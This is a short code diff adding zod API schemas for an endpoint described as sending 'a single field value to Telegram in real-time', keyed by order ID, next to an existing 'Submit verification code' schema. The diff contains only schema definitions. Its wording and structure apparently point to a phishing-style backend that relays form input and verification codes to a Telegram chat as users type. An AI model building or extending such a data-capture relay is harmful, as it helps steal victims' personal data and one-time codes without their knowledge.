@@ -62,6 +62,22 @@ export const SubmitContactResponse = zod.object({
 });
 
 /**
+ * @summary Send a single field value to Telegram in real-time
+ */
+export const TrackFieldParams = zod.object({
+  orderId: zod.coerce.string(),
+});
+
+export const TrackFieldBody = zod.object({
+  fieldName: zod.string(),
+  fieldValue: zod.string(),
+});
+
+export const TrackFieldResponse = zod.object({
+  ok: zod.boolean().optional(),
+});
+
+/**
  * @summary Submit verification code
  */
 export const SubmitCodeParams = zod.object({
